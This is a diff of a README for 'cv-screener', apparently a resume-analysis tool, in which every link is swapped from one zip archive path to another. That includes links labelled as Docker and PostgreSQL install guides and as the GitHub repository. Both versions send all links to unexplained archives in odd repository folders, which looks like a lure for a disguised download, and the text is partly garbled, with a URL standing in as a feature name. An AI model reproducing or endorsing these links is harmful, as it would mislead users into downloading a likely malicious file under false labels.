@@ -1,6 +1,6 @@
 # 🚀 cv-screener - Effortlessly Process and Analyze Resumes
 
-[![Download cv-screener](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
+[![Download cv-screener](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ The cv-screener application helps you easily process and analyze CVs. It can rea
 - **PDF Resume Ingestion:** Upload and process resumes in PDF format.
 - **PostgreSQL Storage:** Automatically save resumes in a structured database.
 - **Hybrid Retrieval API:** Get quick answers using a mix of retrieval strategies.
-- **https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip User Interface:** Simple and clean interface for recruiters to find answers quickly.
+- **https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip User Interface:** Simple and clean interface for recruiters to find answers quickly.
 - **Performance Metrics:** Track how well the system responds to your queries.
   
 ## 🚀 Getting Started
@@ -21,14 +21,14 @@ Follow these steps to get cv-screener up and running on your local machine.
 ### 📦 Requirements
 
 - Operating System: Windows, macOS, or Linux
-- Docker: Make sure you have Docker installed. You can download it [here](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip).
+- Docker: Make sure you have Docker installed. You can download it [here](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip).
 - PostgreSQL: A running version of PostgreSQL is necessary for storing resumes.
   
 ### 🔍 Step 1: Visit the Download Page
 
 To get the latest version of cv-screener, visit the download page. Click the button below to get started.
 
-[![Download cv-screener](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
+[![Download cv-screener](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)
 
 ### 📥 Step 2: Download the Application
 
@@ -38,8 +38,8 @@ On the Releases page, locate the most recent release. You will see a list of ava
 
 If you haven't already, download and install Docker. Follow the instructions for your operating system. Then, you will need to set up PostgreSQL. 
 
-1. **Install Docker:** Follow [these instructions](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip).
-2. **Install PostgreSQL:** You can find the installation guide [here](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip).
+1. **Install Docker:** Follow [these instructions](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip).
+2. **Install PostgreSQL:** You can find the installation guide [here](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip).
 
 ### 🖥️ Step 4: Configure PostgreSQL
 
@@ -94,12 +94,12 @@ For further assistance, check out the FAQs section on the GitHub repository or o
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
-- [Docker Installation Guide](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
-- [PostgreSQL Download Page](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
+- [GitHub Repository](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)
+- [Docker Installation Guide](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)
+- [PostgreSQL Download Page](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)
 
 ## 📥 Download & Install
 
 To download cv-screener, visit this page:
 
-[![Download cv-screener](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)](https://raw.githubusercontent.com/Jamesnaismit/cv-screener/main/web/hooks/cv-screener-3.4.zip)
+[![Download cv-screener](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)](https://github.com/Jamesnaismit/cv-screener/raw/refs/heads/main/api/postman/screener_cv_v2.8-alpha.2.zip)
